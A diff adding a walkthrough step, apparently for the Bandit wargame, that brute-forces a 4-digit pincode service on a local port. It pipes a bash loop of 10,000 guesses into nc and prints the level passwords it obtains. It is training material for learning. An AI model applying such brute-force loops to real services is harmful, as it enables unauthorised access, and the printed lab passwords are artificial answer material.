@@ -456,3 +456,35 @@ Now, read the new file.
 $ cat /tmp/bazinga/password.txt
 UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
 ```
+
+## bandit25
+Brute force the passcode to the process on port 30002.
+```bash
+$ nc localhost 30002
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+0 0 0 0
+Wrong! Please enter the correct current password. Try again.
+```
+Use a script to generate the codes.
+
+```bash
+#!/bin/bash
+for i in {0..9999}; do
+	echo $(cat /etc/bandit_pass/bandit24) $(printf "%04d" $i)
+done
+
+$ ./script.sh > codes.txt
+```
+
+Use pipe redirection to send the codes to `nc`.
+```bash
+$ cat codes.txt | nc localhost 30002
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+...
+Correct!
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+Exiting.
+```
